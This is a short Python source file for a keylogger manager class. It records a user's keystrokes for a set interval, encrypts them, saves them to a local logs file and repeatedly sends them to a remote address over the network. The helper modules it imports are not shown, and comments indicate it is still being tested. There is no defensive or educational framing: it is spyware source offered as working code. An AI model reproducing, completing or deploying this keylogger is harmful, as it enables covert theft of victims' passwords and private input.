import encryption, filemaker, listen, network
import time
class KeyLoggerManager:
    #clock is how often to send data in seconds
    def __init__(self, clock:int, key:str, address:str):
        self.clock = clock
        self.logger = listen.IKeyLogger()
        self.data = None
        self.key = key
        self.address = address
    def start(self):
        listen.start_logging()
    def send(self) -> None:
        while True:
            network_writer = network.NetworkWriter()
            network_writer.send_data(self.data, self.address)
    def file(self):
        file_maker = filemaker.FileWriter('logs.txt')
        file_maker.write_data(self.data)
    
    def encrypt(self):  
        self.data = encryption.Encryptor(self.key, self.data)
        self.data = self.data.encrypt(self.data)    
    def stop(self):
        self.logger.stop_logging()
        self.data = listen.get_logged_keys(self)
    #these prints are just for testing and will be deleted after testing    
    def run(self):
        print("process started")
        self.start()
        print("logging started")
        time.sleep(self.clock)
        self.stop()
        print("logging stopped")
        self.encrypt()
        print("data encrypted")
        self.file()
        print("data written to file")
        self.send()
        print("data sent to server")
        
        print("process complete")
    
"""
manages the program
"""
